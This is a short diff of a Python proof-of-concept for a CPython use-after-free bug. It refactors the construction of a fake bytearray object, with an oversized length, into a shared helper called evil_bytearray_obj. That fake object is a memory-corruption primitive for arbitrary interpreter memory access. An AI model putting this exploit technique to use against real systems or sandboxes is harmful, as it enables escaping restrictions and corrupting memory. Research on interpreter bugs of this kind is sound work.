@@ -13,18 +13,13 @@ Bug Credits: @Nico-Posada
 # No source code because idk what to show.
 # Source: trust me bro
 
+from common import evil_bytearray_obj
+
 class bytes_subclass(bytes):
     pass
 
-p64 = lambda num: num.to_bytes(8, 'little')
-fake_obj = (
-    p64(0x12345) +
-    p64(id(bytearray)) +
-    p64(2**63 - 1) +
-    p64(2**63 - 1) +
-    p64(0) +
-    p64(0)
-)
+# see ./common/common.py for evil bytearray obj explanation
+fake_obj, _ = evil_bytearray_obj()
 
 SIZE = 0x100
 class UAF:
